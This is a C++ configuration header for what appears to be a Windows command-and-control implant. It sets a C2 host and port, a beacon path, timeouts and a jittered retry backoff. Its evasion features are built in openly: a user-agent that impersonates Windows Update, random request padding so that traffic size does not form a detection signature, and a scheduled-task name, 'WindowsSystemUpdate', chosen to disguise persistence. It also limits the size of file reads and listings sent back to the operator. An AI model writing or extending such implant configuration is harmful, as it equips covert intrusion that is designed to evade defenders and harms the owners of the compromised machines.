#pragma once

#include <cstddef>

#ifndef C2_HOST
#define C2_HOST L"10.84.107.108"
#endif

#ifndef C2_PORT
#define C2_PORT 8000
#endif

// Path used for every beacon request.
constexpr wchar_t BeaconPath[] = L"/api/v2/ping";

// User-Agent sent with every request.
constexpr wchar_t UserAgent[] =
	L"Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.0";

constexpr char FallbackAgentId[] = "VM-Windows-01";

// Timeouts

constexpr int TimeoutResolveMs = 3000;
constexpr int TimeoutConnectMs = 3000;
constexpr int TimeoutSendMs    = 10000;
constexpr int TimeoutReceiveMs = 60000;

// Retry policy

constexpr int BackoffMs[] = {30000, 60000, 120000, 300000};
constexpr int BackoffSteps = 4;
constexpr int BackoffJitterPct = 20;

// Random body padding so the request size is not a stable signature.

constexpr int PadMinBytes = 256;
constexpr int PadMaxBytes = 1024;

// A command result travels inside a JSON field: its size must stay bounded.

constexpr std::size_t MaxListingEntries = 1000;
constexpr std::size_t MaxReadBytes = 256 * 1024;

// A command is a single short line: a bigger response is abnormal.

constexpr std::size_t MaxResponseBytes = 1024 * 1024;

// Persistence

constexpr char TaskName[] = "WindowsSystemUpdate";
